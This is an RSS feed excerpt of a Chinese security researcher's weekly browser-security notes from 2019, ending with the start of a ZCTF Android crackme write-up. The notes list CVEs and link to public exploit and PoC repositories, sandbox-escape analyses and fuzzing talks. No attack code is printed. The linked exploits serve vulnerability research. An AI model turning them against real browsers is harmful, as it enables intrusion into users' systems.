&lt;p&gt;（零基础，组里没浏览器大佬带，年底搞不出东西等于卷铺盖，差不多算是置之死地而后生，感觉现在学习的时候动力挺足的，希望能一直像现在这样打鸡血的状态！）&lt;/p&gt;
</description>
                <pubDate>Fri, 12 Apr 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/04/12/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.04.08-2019.04.12.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/04/12/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.04.08-2019.04.12.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.04.01 - 2019.04.05</title>
                <description>&lt;p&gt;在Github上面发现了一个Chrome 1Day利用，最新的Chrome可用，无沙箱模式下运行&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/exodusintel/Chromium-941743&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以下为补丁等链接&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://chromium-review.googlesource.com/c/v8/v8/+/1526018&lt;/li&gt;
  &lt;li&gt;https://blog.exodusintel.com/2019/04/03/a-window-of-opportunity/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;计算器弹的好，朋友圈里当大佬&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/6788F7434D8C78A745183FF3049AC504.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最近在新加坡举办的BlackHat Asia有一个通过JIT漏洞攻击Edge的议题，JIT这部分是我的硬伤，最近还在学习编译原理，我得抓紧时间了&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Li-Using-the-JIT-Vulnerability-to-Pwning-Microsoft-Edge.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;之前有一个Fuzzilli，讲的是把JS编译为IL，然后变异IL再转为JS，我一直搞不懂怎么保证JS语义的准确那个议题，最近公开了第一波用这个Fuzzer挖掘的漏洞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/list?can=1&amp;amp;q=owner%3Asaelo%40google.com&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以下来自玄武推送：&lt;/p&gt;

&lt;p&gt;CVE-2019-8558 JavaScriptCore CodeBlock UAF漏洞披露&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1783&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CVE-2019-8506 JavaScriptCore createRegExpMatchesArray未进行推断类型更新漏洞披露&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1753&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Chrome JSPromise::TriggerPromiseReactions类型混淆漏洞披露&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1784&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CVE-2019-9813 SpiderMonkey未正确的更新类型推断导致类型混淆&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1810&lt;/li&gt;
&lt;/ul&gt;
</description>
                <pubDate>Fri, 05 Apr 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/04/05/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.04.01-2019.04.05.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/04/05/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.04.01-2019.04.05.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.03.25 - 2019.03.29</title>
                <description>&lt;p&gt;这周终于又可以开始搞浏览器了&lt;/p&gt;

&lt;p&gt;看了lcatro师傅的一篇文章，仔细理解了一下师傅所说的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;”领悟了JavaScript中的漏洞成因”&lt;/code&gt;，不过看情况我好像还没有真正理解&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/lcatro/my-blog/tree/master/2017/diff_note&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;微博上看到的一行代码逃逸Safari沙箱&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://medium.com/p/one-liner-safari-sandbox-escape-exploit-91082ddbe6ef&lt;/li&gt;
  &lt;li&gt;https://weibo.com/ttarticle/p/show?id=2309404354112320866984&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;今年Pwn2Own火狐的两个漏洞相关&lt;/p&gt;

&lt;p&gt;CVE-2019-9810&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/mozilla/gecko-dev/commit/369406707f9fef96ac8405fb9cbb58da4bcc4f1d&lt;/li&gt;
  &lt;li&gt;https://github.com/xuechiyaobai/CVE-2019-9810-PoC/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CVE-2019-9813&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/mozilla/gecko-dev/commit/601d226fe3690ff57287580431fd9a937298be80&lt;/li&gt;
  &lt;li&gt;https://github.com/mozilla/gecko-dev/commit/752be3958fc6f6eb83eaa4a35fae1a99dc54746e&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CVE-2018-17480 天府杯攻破Chrome的漏洞：ValueDeserializer::ReadDenseJSArray越界写漏洞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=905940&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以下来自玄武推送&lt;/p&gt;

&lt;p&gt;CVE-2019-5798 Skia SkPath::transform的OOB漏洞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=883596&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CVE-2019-5755 V8 SpeculativeSafeIntegerSubtract的类型信息错误漏洞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=913296&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CVE-2018-17478 V8 array sort安全漏洞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=897512&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CVE-2019-9791 Spidermonkey IonMonkey的类型推断错误导致的类型混淆漏洞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1791&lt;/li&gt;
&lt;/ul&gt;
</description>
                <pubDate>Fri, 29 Mar 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/03/29/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.03.25-2019.03.29.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/03/29/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.03.25-2019.03.29.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.03.18 - 2019.03.22</title>
                <description>&lt;p&gt;继续逆向逆的头秃，搞逆向挺好的，就是头有点冷&lt;/p&gt;

&lt;p&gt;逆向穷三代，挖洞富一生，挖洞大佬带带我吧&lt;/p&gt;

&lt;p&gt;湛泸实验室写了一篇关于CVE-2019-5786的分析，该漏洞被谷歌威胁分析团队从在野攻击样本中捕获，而且攻击样本带了一个win32k.sys的内核提权的漏洞&lt;a href=&quot;https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2019-0808&quot;&gt;CVE-2019-0808&lt;/a&gt;，结合这个洞，可以实现在Win7上穿Chrome沙箱&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://weibo.com/ttarticle/p/show?id=2309404351596157885398&lt;/li&gt;
  &lt;li&gt;https://paper.seebug.org/862/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这个漏洞还有俩安全团队也给分析了&lt;/p&gt;

&lt;p&gt;CVE-2019-5786 针对Chrome RCE 0day的分析与利用&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://blog.exodusintel.com/2019/02/20/cve-2019-5786-analysis-and-exploitation/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;连麦咖啡也来凑了下热闹&lt;/p&gt;

&lt;p&gt;CVE-2019-5786 McAfee对被在野利用的Chrome远程代码执行漏洞的分析&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mcafee.ly/2HG3BRo&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以下来自玄武推送&lt;/p&gt;

&lt;p&gt;CVE-2018-18342 array对象不可配置的length属性重定义漏洞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=906313&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CVE-2019-5790 V8中的堆缓冲区溢出漏洞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mtowalski.github.io/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CVE-2019-5788 Chrome FileSystemOperationRunner中的UAF漏洞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1767&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CVE-2019-5789 Chrome MidiManagerWin中的UAF漏洞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1754&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Samuel Groß的JavaScript Fuzzer fuzzilli开源了，通过先转换成自定义的IL，变异后再lift回 JavaScript，很好的解决了语义正确性的问题，之前和师傅聊天提到了这个，我一直在想改了IL之后，如何保证JS的语义正确的处理思路，接下来抽空好好读读代码&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/googleprojectzero/fuzzilli&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CVE-2019-0612 Microsoft Edge中的利用CObjectElement::FinalCreateObject绕过Flash click2play漏洞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1747&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;怠惰啊，感觉这三周都没有学习浏览器了，一点新知识都没有学到，焦虑&lt;/p&gt;
</description>
                <pubDate>Fri, 22 Mar 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/03/22/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.03.18-2019.03.22.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/03/22/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.03.18-2019.03.22.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.03.11 - 2019.03.15</title>
                <description>&lt;p&gt;好在是干回了老本行，还是比较得心应手的&lt;/p&gt;

&lt;p&gt;下面都是来自玄武日常推送&lt;/p&gt;

&lt;p&gt;CVE-2018-4441 在PS4 6.20上的WebKit远程代码执行漏洞利用&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/Cryptogenic/PS4-6.20-WebKit-Code-Execution-Exploit&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;劫持Chrome会话以绕过多因素认证&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://ijustwannared.team/2019/03/11/browser-pivot-for-chrome/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;为Ghidra编写wasm加载器Part 1:分析问题并配置环境&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://habr.com/en/post/443318/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ChakraCore的3月补丁发布&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/Microsoft/ChakraCore/pull/6016&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;tor(8.0.6) + firefox(65.0.2) 远程代码执行沙箱绕过0day演示，这是个系列，有师傅在大早上就给我发了个360浏览器的RCE，也是这个UP主上传的，吓得我差点从椅子上摔下来，毕竟出问题我可是要被按在地上摩擦的，有兴趣看的可以进去看看UP主上传的其它视频&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.youtube.com/watch?v=QH5EoGCd31I&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;V8 v7.4起正式支持无JIT的模式，可用于禁止动态分配的环境（如iOS），以及减少任意代码执行攻击面，之前有师傅和我说过，V8现在已经上了JIT不可以同时存在RWX三种属性，所以之前泄漏JIT函数指令地址的方式已经不可行了，但是有一种新的攻击方式是使用WebAssembly，依旧可以达到修改指令并执行的效果&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://v8.dev/blog/jitless&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CVE-2018-4262 JavaScriptCore JIT正则表达式的优化处理函数漏洞分析&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.thezdi.com/blog/2019/3/14/the-apple-bug-that-fell-near-the-webkit-tree&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CVE-2019-0541 Windows MSHTML引擎”Edit”远程代码执行漏洞披露&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.exploit-db.com/exploits/46536&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;昨天收到内网邮件说是让我今天去参加春招面试官培训&lt;/p&gt;

&lt;p&gt;我：？？？&lt;/p&gt;

&lt;p&gt;然后今天下午就过去听了两个小时，学到了很多面试心理学的知识，挺有意思的，也大概知道了一面二面HR面都面些什么东西&lt;/p&gt;

&lt;p&gt;技术岗：
一面：技术基础，涉及领域
二面：成就导向，创新能力，团队合作，沟通能力
HR面：成就导向，学习能力，团队合作&lt;/p&gt;

&lt;p&gt;产品岗：
一面：主动性，沟通能力，团队合作，问题分析能力，创新能力
二面：执行力，灵活应变，逻辑思维，学习能力，业务能力
HR面：职位匹配性，成就动机，沟通协调，合作意识&lt;/p&gt;

&lt;p&gt;其中有一个SBO面试法我觉得挺专业的：Solution，Behavior，Outcome&lt;/p&gt;

&lt;p&gt;给一个场景（Situation），比如开发或者性能优化遇到了一个技术瓶颈，考察面试者会怎么思考，如何解决，怎么做（Behavior），最后能够做到一个什么样的结果（Outcome）&lt;/p&gt;

&lt;p&gt;比如考察学习能力：可以询问为什么学习，学习过程遇到了什么样的难度，学的目的是什么，最后学到什么程度，能解决什么样的问题&lt;/p&gt;

&lt;p&gt;问一个比较常规的问题：问一些最近做的一些项目，都负责了哪些模块，遇到了什么问题，怎么解决的，最后做到了什么效果&lt;/p&gt;

&lt;p&gt;再问一个印象深刻的项目，为什么印象深刻，最后做完后学到了哪些等等&lt;/p&gt;

&lt;p&gt;结束SBO面试法之后一个重要步骤：考察候选人是优秀还是一般&lt;/p&gt;

&lt;p&gt;可以问两个问题：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;复盘来看，整个行为过程中，你自己有总结过哪些地方可以做的更好吗？以保证了最终的这个结果的呈现？你学到了哪些东西？&lt;/li&gt;
  &lt;li&gt;如果让你再来一次，哪个环节，流程，行动你觉得可以改进，进而取得更好的效果？&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;我觉得今天听到的这些知识对自己来说也是一个很重要的评判标准，收获颇多！&lt;/p&gt;

&lt;p&gt;尝试上手 -&amp;gt; 遇到问题 -&amp;gt; 解决问题 -&amp;gt;（重复几次）-&amp;gt; 完成 -&amp;gt; 复盘反思总结可以做的更好的地方 -&amp;gt; 开始下一次&lt;/p&gt;
</description>
                <pubDate>Fri, 15 Mar 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/03/15/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.03.11-2019.03.15.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/03/15/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.03.11-2019.03.15.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.03.04 - 2019.03.08</title>
                <description>&lt;p&gt;这周看玄武日常推送的排版风格不太一样了，是不是负责写推送的师傅换人了？&lt;/p&gt;

&lt;p&gt;这周把近年来V8的一些越界访问，类型混淆这些可以利用的漏洞Poc整理了一下，大概是48个，接下来的时间开始把漏洞分析给写上，顺带练练写利用的能力，以下是部分：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/E32CC9E6BC079F46F201B7332DC1EFB3.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我发现自己分析浏览器漏洞的速度特别慢，最近每一次出个新漏洞，大概率在一个我之前没接触过的模块，光了解这个模块以及跑通Poc就得花一大段时间，还是太菜了&lt;/p&gt;

&lt;p&gt;（要是部门里有个研究Chrome的大佬估计这情况就会好很多吧）&lt;/p&gt;

&lt;p&gt;谷歌修了一个在野被利用的漏洞：CVE-2019-5786&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://chromereleases.googleblog.com/2019/03/stable-channel-update-for-desktop.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;绕JS沙箱&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;现在总感觉时间不够用，想仔细搞搞浏览器，业务上又一大堆事情要处理，可以说是很羡慕那些在专门搞浏览器安全研究实验室或者团队里的师傅了&lt;/p&gt;

&lt;p&gt;其实说这些东西，倒不是我想要有师傅手把手带，只是希望能有一个领路的，平时可以和我聊聊天，告诉我这样的初学者搞浏览器安全的大方向是什么，想搞哪个模块可以给点学习和研究的建议，而不是我现在这样分析一个洞，发现这个知识点不会，然后又发现那个也不会，啥都搞，也啥都搞不好，感觉我现在浏览器安全这棵技能树千疮百孔的，💊！&lt;/p&gt;

&lt;p&gt;好在最近还是有点收获的，先把编译原理这个部分弄一遍，一些之前分析的漏洞估计会有新的理解&lt;/p&gt;

&lt;p&gt;之前有师傅说，写Fuzzer得先看看能不能把历史的漏洞给跑出来，过段时间等这些洞分析完，看看写个像样的JSFuzzer跑跑这些历史漏洞&lt;/p&gt;

&lt;p&gt;感觉JS也得再深入的学习，现在我掌握的语法还是比较基础&lt;/p&gt;
</description>
                <pubDate>Fri, 08 Mar 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/03/08/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.03.04-2019.03.08.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/03/08/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.03.04-2019.03.08.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.02.25 - 2019.03.01</title>
                <description>&lt;p&gt;上周发完了周报之后，紧接着泉哥就发了一篇文章《https://mp.weixin.qq.com/s/8bpcNK06tpKbi7gHJEdlUA》，里面刚好就把我那个还没研究完的Chrome Sandbox Escape给简单分析了一下，大家可以看泉哥的原文&lt;/p&gt;

&lt;p&gt;又仔细的读了泉哥在一月份发的一篇文章《https://mp.weixin.qq.com/s/WrSZpqgq6gvZwEIqghqggg》，这篇文章常看常新&lt;/p&gt;

&lt;p&gt;玄武那天推送的文章里有一篇文章讲JS引擎的基础知识，非常长，还没看完，下周接着看&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://slidr.io/bmeurer/javascript-engine-fundamentals-the-good-the-bad-and-the-ugly#1&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;昨天下午爆出了一个Chrome PDF的漏洞，细节是用Chrome下载PDF的时候，如果PDF里面有JS函数submitForm就会导致本地信息上传，昨晚为了这个洞还加了会儿班复现&lt;/p&gt;

&lt;p&gt;这个洞目前已经有在野的样本了，请大家近期不要用Chrome打开PDF，四月份的时候谷歌差不多会修复&lt;/p&gt;

&lt;p&gt;下周要给组里的师傅们分享下我最近学习的浏览器漏洞利用，周末还得再赶一波PPT，期待大佬们不要嫌弃我渣渣的技术！&lt;/p&gt;

&lt;p&gt;还有一个Chrome RCE洞，之前公开的CVE-2018-17463，我最近才看到&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://crbug.com/888923&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以下来自玄武实验室的日常推送，还没来得及看，记笔记时间：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;[ Browser ]   WebKit JS reifyStaticProperty 未包含 PropertyAttribute::CustomAccessor 标记所导致的类型混淆漏洞披露（CVE-2019-6215）：
https://bugs.chromium.org/p/project-zero/issues/detail?id=1723&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;[ Browser ]  WebKit 的一个 1day RCE 漏洞的 POC：
1)https://ghostbin.com/paste/c4dhv 2)https://github.com/WebKit/webkit/commit/d51ece4028133113e9e5d0f2576ad23489801ddc#diff-f12d9399bdac100971ed79b172408ace&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;[ Browser ]  如何分析 IE/EDGE Crash 的可利用性：
https://movaxbx.ru/2019/02/20/triaging-the-exploitability-of-ie-edge-crashes/&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;[ Vulnerability ]  JSC JSArray::unshiftCountWithArrayStorage 的越界读写漏洞（CVE-2018-4441）与利用： 
https://melligra.fun/webkit/2019/02/15/cve-2018-4441/&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;[ Browser ]  Edge 自定义 URI 滥用漏洞（CVE-2018-8495）利用： 
https://github.com/kmkz/exploit/blob/master/CVE-2018-8495.html&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;[ Browser ]  Chrome P2PSocketDispatcherHost 中 RenderProcessHostImpl 的 UAF 漏洞，来自 Project Zero：&lt;br /&gt;
https://bugs.chromium.org/p/project-zero/issues/detail?id=1743&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;[ Browser ]  Chrome PaymentRequest 服务的 UAF 漏洞，来自 Project Zero：
 https://bugs.chromium.org/p/project-zero/issues/detail?id=1735&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;[ Browser ]  Chrome RenderFrameHostImpl::CreateMediaStreamDispatcherHost 中的 UAF 漏洞，来自Project Zero：&lt;br /&gt;
https://bugs.chromium.org/p/project-zero/issues/detail?id=1730&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;[ Browser ]  Chrome FileWriterImpl 的高危 UAF 漏洞，来自Project Zero ：
 https://bugs.chromium.org/p/project-zero/issues/detail?id=1755&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;
</description>
                <pubDate>Fri, 01 Mar 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/03/01/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.02.25-2019.03.01.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/03/01/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.02.25-2019.03.01.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.02.18 - 2019.02.22</title>
                <description>&lt;p&gt;是的，现在开始每周六我会总结推送这一周浏览器安全相关的消息，顺带放一些我本周学习的资料，来源就是一些Exp平台，玄武安全推送，GitHub，推特等，因为平时有工作业务，不能像在校生或者专门搞研究的Team那样大把时间研究，加油学习吧！&lt;/p&gt;

&lt;p&gt;这周一直在搞这个洞，之前我没有研究过Chrome的IPC机制，这个漏洞我还没研究清楚，要是有师傅可以指点一下，感激不尽！&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;https://github.com/phoenhex/files/blob/master/slides/chrome_ipc_exploitation_offensivecon19.pdf&lt;/li&gt;
  &lt;li&gt;https://github.com/niklasb/hack2win-chrome/&lt;/li&gt;
  &lt;li&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=888926&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;关于如何Fuzz JS引擎&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://saelo.github.io/presentations/offensivecon_19_fuzzilli.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;今年BlueHatIL的议题，当时议题出来后我期待了好久，其它的Slide和视频可以从第二个链接里找到&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/bkth/Attacking-Edge-Through-the-JavaScript-Compiler&lt;/li&gt;
  &lt;li&gt;https://www.bluehatil.com/abstracts#collapseAttacking
Safari 76的技术预览版修复日志，我现在没有研究Safari，这里记一下笔记&lt;/li&gt;
  &lt;li&gt;https://webkit.org/blog/8607/release-notes-for-safari-technology-preview-76/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;之前我没有接触过Chrome的IPC机制，看了些资料，大概了解了下是怎么回事，前段时间口碑暴涨的35C3会议上有一个讲如何挖Chrome IPC漏洞再到Chrome Sandbox Escape的议题，剩下的时间看了些《程序设计语言-实践之路》，刷了下B站上面的编译原理课程，想来也是有意思，我上B站没看过其它的，一个Pwn的题目讲解，一个浏览器扩展漏洞分析，然后就是哈工大编译原理课，xswl&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://media.ccc.de/v/35c3-9579-attacking_chrome_ipc&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;要是有想加个好友一起学习浏览器安全的师傅，可以后台留言啊！&lt;/p&gt;

</description>
                <pubDate>Fri, 22 Feb 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/02/22/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.02.18-2019.02.22.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/02/22/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.02.18-2019.02.22.html</guid>
            </item>
        
            <item>
                <title>2016 ZCTF - android1-200</title>
                <description>&lt;p&gt;Java层的代码比常规的CM多了不少&lt;/p&gt;

&lt;p&gt;关键的就在点击事件里&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public void attemptLogin() {
	String username = this.mEmailView.getText().toString();
	String password = this.mPasswordView.getText().toString();
	View focusView;
	if (!TextUtils.isEmpty(password) &amp;amp;&amp;amp; !isPasswordValid(password)) {
		this.mPasswordView.setError(&quot;Password Too Short&quot;);
		focusView = this.mPasswordView;
	} else if (TextUtils.isEmpty(username)) {
		this.mEmailView.setError(&quot;User name is NULL&quot;);
		focusView = this.mEmailView;
	} else if (!isEmailValid(username)) {
		this.mEmailView.setError(&quot;Error&quot;);
		focusView = this.mEmailView;
	} else if (new Auth().auth(this, username + password, databaseopt()) == 1) {
		Toast.makeText(getApplicationContext(), getString(R.string.Auth_Success), 0).show();
		OpenNewActivity(password);
	} else {
		Toast.makeText(getApplicationContext(), getString(R.string.Auth_Fail), 0).show();
	}
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;用户名和密码长度合法性校验&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;private boolean isEmailValid(String email) {
	return true;
}

private boolean isPasswordValid(String password) {
	return password.length() &amp;gt; 4;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;校验函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth()&lt;/code&gt;里移动有三个参数，第二个参数是用户名和密码的结合，第三个参数由下面这个函数计算而出&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public String databaseopt() {
	String DB_PATH = getString(R.string.DB_PATH);
	String DB_NAME = getString(R.string.DB_NAME);
	File f = new File(DB_PATH);
	if (!f.exists()) {
		f.mkdir();
	}
	try {
		InputStream is = getBaseContext().getAssets().open(DB_NAME);
		OutputStream os = new FileOutputStream(DB_PATH + DB_NAME);
		byte[] buffer = new byte[1024];
		while (true) {
			int length = is.read(buffer);
			if (length &amp;lt;= 0) {
				break;
			}
			os.write(buffer, 0, length);
		}
		os.flush();
		os.close();
